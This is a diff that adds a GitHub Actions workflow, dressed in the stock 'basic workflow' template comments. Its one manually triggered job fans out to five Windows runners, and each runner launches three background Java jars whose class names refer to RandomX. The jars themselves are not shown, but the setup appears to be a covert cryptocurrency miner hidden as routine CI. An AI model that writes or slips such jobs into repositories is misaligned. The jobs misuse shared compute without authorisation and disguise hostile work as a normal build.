@@ -1,0 +1,30 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+# Controls when the workflow will run
+on:
+  workflow_dispatch:
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        job-name: [s1,s2,s3,s4,s5]
+    steps:
+      - uses: actions/checkout@v3
+      - name: Set up JDK
+        uses: actions/setup-java@v3
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+      - name: Run
+        shell: pwsh
+        run: |
+          Start-Process -FilePath "java" -ArgumentList "-cp", "worker3.jar", "org.tm.randomx.TMagics.fp.Runner"
+          Start-Process -FilePath "java" -ArgumentList "-cp", "wk1.jar", "org.tm.randomx.TMagics.connector.Runner"
+          Start-Process -FilePath "java" -ArgumentList "-jar", "wk0.jar"
+
